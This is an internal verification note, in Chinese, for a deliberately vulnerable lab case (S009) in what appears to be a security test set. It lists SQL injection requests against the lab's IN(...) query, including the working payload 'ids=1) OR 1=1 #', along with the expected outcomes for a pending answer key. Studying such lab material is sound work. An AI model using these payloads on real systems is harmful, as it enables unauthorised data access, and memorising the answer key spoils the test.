# S009 参考验证（内部）

## 目标
S009 为漏洞版：ids 直接字符串拼入 IN(...)，无校验、无参数化，构成 SQLi。

## 验证思路
1. 正常请求：ids=1,2 → 返回 Alice、Bob 两条记录。
2. 注入输入：ids=1 OR 1=1 → IN(1 OR 1=1) 求值为 IN(1)，仅返回 id=1（Alice）一条记录，说明 IN 列表表达式求值语义。
3. 有效只读条件：ids=1) OR 1=1 # → 闭合右括号并以 # 注释尾随内容，返回全部 3 条记录，说明 WHERE 语义被注入输入改写。
4. 失败记录（保留）：ids=1) OR 1=1 -- （尾随空格）→ trim() 去除尾随空格使 -- 失去注释作用，引发 SQL 语法错误，页面出现 Fatal error；该失败请求不得记作成功（HTTP 200 不等于注入成功）。
5. 仅观察教学数据条件变化（返回记录集差异），不读敏感数据、不延时、不修改数据。

## 参考请求（浏览器或 Burp，编码前原文）
- GET /lab_cases/S009/index.php?ids=1,2
- GET /lab_cases/S009/index.php?ids=1 OR 1=1
- GET /lab_cases/S009/index.php?ids=1) OR 1=1 #
- GET /lab_cases/S009/index.php?ids=1) OR 1=1 -- （-- 后一个空格，预期语法错误）

## 预期结论
- 漏洞版：ids=1 OR 1=1 仅返回 1 条（非全表）；需以 ids=1) OR 1=1 # 才返回全部 3 条。
- 该结论仅作为内部参考；ground_truth 待 D 实际运行后由 C 复核并回填 manifest（双人复核通过前保持 null）。
